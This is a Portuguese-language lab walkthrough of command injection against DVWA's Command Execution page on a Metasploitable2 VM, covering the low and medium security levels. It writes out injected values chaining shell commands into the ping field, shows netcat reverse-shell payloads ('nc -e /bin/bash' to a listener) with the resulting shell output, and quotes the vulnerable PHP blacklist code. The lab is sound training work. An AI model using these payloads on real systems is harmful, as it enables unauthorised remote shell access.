# Command Injection

Esse exercício é realizado na VM do metasploit2. 
- Após iniciar a VM, abrir on endereço IP da VM em um browser
- Selecionar o botão **Command Execution**

![command execution](https://github.com/ops-shadow/Complete-Ethical-Hacking-Bootcamp/blob/74d17509f3dfd75aa6f5ac594284f5f19b786f24/7%20-%20websites/ci_1.png)

## DVWA com Segurança baixa

Para executar o camando ping basta entra o IP desejado e clicar em *submit*

![ping](https://github.com/ops-shadow/Complete-Ethical-Hacking-Bootcamp/blob/74d17509f3dfd75aa6f5ac594284f5f19b786f24/7%20-%20websites/ci_2.png)

Em seguida obtermos o resultado:

![ping resultado](https://github.com/ops-shadow/Complete-Ethical-Hacking-Bootcamp/blob/74d17509f3dfd75aa6f5ac594284f5f19b786f24/7%20-%20websites/ci_3.png)

**A questão:** É possivel injetar comando 'alienígêna' no prompt? 
- Usando o separado ';' injetamos o comando 'ls -la'

  `192.168.1.10; ls -la`

  ![injeção de ls -la](https://github.com/ops-shadow/Complete-Ethical-Hacking-Bootcamp/blob/74d17509f3dfd75aa6f5ac594284f5f19b786f24/7%20-%20websites/ci_4.png)

- Obtemos o seguinte resultado:

  ![injeção de ls -la resultado](https://github.com/ops-shadow/Complete-Ethical-Hacking-Bootcamp/blob/74d17509f3dfd75aa6f5ac594284f5f19b786f24/7%20-%20websites/ci_5.png)

Assim, é possível injetar umcomando malicioso no prompt.
- Para obter um sessão netcat com o alvo, iniciamos o netcat em modo listener em nossa máquina.

  `nc -lvp 12345` - onde 12345 é a porta que seleciomos para a escuta.
  ```
  └─$ nc -lvp 12345
  listening on [any] 12345 ...
  ```

- No prompt da página web, injetamos o comando netcat com a mesma porta do listener.

  `192.168.1.10; nc -e /bin/bash 192.168.1.10 12345`

  ![injeção netcat](https://github.com/ops-shadow/Complete-Ethical-Hacking-Bootcamp/blob/74d17509f3dfd75aa6f5ac594284f5f19b786f24/7%20-%20websites/ci_6.png)

- Em nosso terminal obtemos uma conexão com o VM através do netcat.
  ```
  connect to [192.168.1.10] from (UNKNOWN) [192.168.1.33] 49007
  
  whoami
  www-data
  
  id
  uid=33(www-data) gid=33(www-data) groups=33(www-data)
  
  groups
  www-data
  
  ls -la
  total 20
  drwxr-xr-x  4 www-data www-data 4096 May 20  2012 .
  drwxr-xr-x 11 www-data www-data 4096 May 20  2012 ..
  drwxr-xr-x  2 www-data www-data 4096 May 20  2012 help
  -rw-r--r--  1 www-data www-data 1509 Mar 16  2010 index.php
  drwxr-xr-x  2 www-data www-data 4096 May 20  2012 source
  ```
Essa vunerabilidade ocorre devido a falha de programação da página web, que aceita operadores que controlam como e quando os comandos são executados.

## DVWA com Segurança baixa

Tentaremos novamente injetar um comando malicioso no prompt da página, mas desta vez com a segurança em nível médio.

 - Repetindo a injeção de comando com operador **;**: `192,168.1.10; ls -la`, não obtemos resposta, indicando que esse operador é inútil para nossos objetivos.
 - Contudo, existem outros operadores para controle de fluxo de comandos:
   - `comando1 ; comando2` - comando2 será executado **sempre**, mesmo que comando1 falhe.
   - `comando1 && comando2` - comando2 só será executado se comando1 **retornar sucesso**
   - `comando &` -  comando é iniciado **em background**, liberando o terminal para outras tarefas.
   - `comando1 | comando2` - Conecta comandos: a saída de comando1 vira a entrada de comando2.
  - O primeiro opetrador (;) foi rejeitado, vamos para o seguinte:
  - Operador &&: `192,168.1.10 && ls -la`
    - Também não funcionou
  - Operador &: `192,168.1.10 & ls -la`
    - A injeção funcionou.
    
      !resultado injeção
         
  - Operado |: `192,168.1.10 | ls -la`
    - De forma similar ao operado &, também funcionou.

De forma análoga a injeção no DVWA de baixa segurança, podemos injetar um comando de netcat.
- `192.168.1.10 & nc -e /bin/bash 192.168.1.10 12345`, ou
- `192.168.1.10 | nc -e /bin/bash 192.168.1.10 12345`

Obtendo mais uma vez conexão via netcat.
```
└─$ nc -lvp 12345
listening on [any] 12345 ...
192.168.1.33: inverse host lookup failed: Unknown host
connect to [192.168.1.10] from (UNKNOWN) [192.168.1.33] 38607

whoami
www-data
```
Apesar de filtar os operadores ";" e "&&", a página ainda deixou algums operadores de fora, sendo possível a injeção de comando.
```
 <?php

if( isset( $_POST[ 'submit'] ) ) {

    $target = $_REQUEST[ 'ip' ];

    // Remove any of the charactars in the array (blacklist).
    $substitutions = array(
        '&&' => '',
        ';' => '',
    );

    $target = str_replace( array_keys( $substitutions ), $substitutions, $target );
    
    // Determine OS and execute the ping command.
    if (stristr(php_uname('s'), 'Windows NT')) { 
    
        $cmd = shell_exec( 'ping  ' . $target );
        echo '<pre>'.$cmd.'</pre>';
        
    } else { 
    
        $cmd = shell_exec( 'ping  -c 3 ' . $target );
        echo '<pre>'.$cmd.'</pre>';
        
    }
}

?>
```
## DVWA com Segurança alta

O DVWA Command Execution é **projetado para bloquear tentativas de injeção de comandos** no **nível alto**.

O nível High foi feito para simular um ambiente mais seguro, aplica validação rigorosa de entrada, usando funções como escapeshellcmd() ou preg_match() para filtrar comandos maliciosos. Isso impede injeções direta. Ele  mas ainda pode ser explorado com técnicas avançadas, especialmente se combinado com outras vulnerabilidades (como file upload ou XSS).



